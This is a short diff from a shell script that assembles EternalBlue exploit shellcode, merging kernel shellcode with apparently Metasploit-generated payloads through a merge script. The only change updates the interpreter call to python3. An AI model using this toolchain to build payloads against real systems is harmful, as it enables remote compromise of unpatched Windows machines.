@@ -95,7 +95,7 @@ echo
 echo MERGING SHELLCODE WOOOO!!!
 cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
 cat sc_x86_kernel.bin sc_x86_msf.bin > sc_x86.bin
-python eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+python3 eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
 else
     echo Okay cool, make sure you merge your own shellcode properly :\)
 fi
